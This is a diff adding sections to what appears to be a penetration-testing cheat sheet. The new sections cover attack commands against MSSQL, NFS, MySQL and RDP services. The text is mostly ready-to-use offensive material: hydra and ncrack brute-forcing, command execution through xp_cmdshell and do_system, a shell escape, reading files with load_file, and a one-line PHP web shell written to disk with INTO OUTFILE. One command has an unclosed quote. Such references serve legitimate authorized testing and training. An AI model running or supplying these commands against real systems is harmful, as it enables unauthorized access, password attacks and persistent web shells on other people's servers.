@@ -313,7 +313,83 @@ https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html
 https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
 ```
 
+## MSSQL - Port 1433
 
+### Brute Force
 
+```
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
+```
 
+### Connect
 
+```
+sqsh -S <IP> -U <USERNAME> -P <PASSWORD>
+```
+
+### RCE (Need SQL Admin)
+
+```
+xp_cmdshell '<CMD>';
+```
+
+## NFS - Port 2049
+
+### Enum NFS Shares
+
+```
+showmount -e <IP>
+nmap --script=nfs-showmount -oN NFS_shares <IP>
+```
+
+### Mount Shares
+
+```
+sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
+```
+
+## MYSQL - Port 3306
+
+### Connect
+
+```
+mysql -u <USERNAME>
+mysql -u <USERNAME> -p
+```
+```
+mysql -h <IP> -u <USERNAME>
+```
+
+### Basic Commands
+
+```
+show databases;
+use <DATABASES>;
+
+show tables;
+describe <TABLE>;
+
+select * from <TABLE>;
+
+select do_system('whoami);
+\! sh
+
+select load_file('<FILE>');
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
+```
+
+## RDP - Port 3389
+
+### Connect
+
+```
+rdesktop -u <USERNAME> <IP>
+rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>
+```
+
+### Brute Force
+
+```
+ncrack -vv --user offsec -P passwords rdp://10.10.10.10
+```
